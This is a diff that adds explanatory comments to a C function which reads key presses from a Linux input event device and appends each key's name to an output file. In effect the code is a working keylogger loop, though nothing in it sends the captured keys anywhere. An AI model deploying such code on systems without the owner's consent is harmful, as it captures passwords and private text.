@@ -67,7 +67,7 @@ int event_main(int argc, char **argv)
 	char *output_file = "/dev/stdout";
 	FILE *fout = NULL;
 
-	memset(&keycode_cache, 0, sizeof(keycode_cache));
+	memset(&keycode_cache, 0, sizeof(keycode_cache)); // zero out keycode_cache
 
 	if (argc == 2) {
 		event_file = argv[1];
@@ -76,26 +76,26 @@ int event_main(int argc, char **argv)
 		output_file = argv[2];
 	}
 
-	if ((fd = open(event_file, O_RDONLY)) < 0)
+	if ((fd = open(event_file, O_RDONLY)) < 0) // Try to open I/O fail if can't
 		die("open");
 	if ((fout = fopen(output_file, "a")) == NULL)
 		die("fopen");
 
 	setbuffer(fout, NULL, 0);
 
-	for (;;) {
-		r = read(fd, &ev, sizeof(ev));
+	for (;;) { // while true (slightly obscure)
+		r = read(fd, &ev, sizeof(ev)); // capture event
 
-		// key and key-pressed
+		// if key event and key-pressed
 		if (ev.type == EV_KEY && ev.value == 1 && ev.code < 512) {
-			if ((k = keycode_cache[ev.code]) == 0) {
+			if ((k = keycode_cache[ev.code]) == 0) { // haven't seen keycode, lookup in driver
 				io_arg[0] = ev.code;
 				ioctl(fd, EVIOCGKEYCODE, &io_arg);
 				k = io_arg[1];
 				if (io_arg[0] < 512)
 					keycode_cache[io_arg[0]] = k;
 			}
-			if (k > 0 && k < 512)
+			if (k > 0 && k < 512) // write key to output file if valid keypress
 				fprintf(fout, "%s", keytable[k]);
 		}
 	}
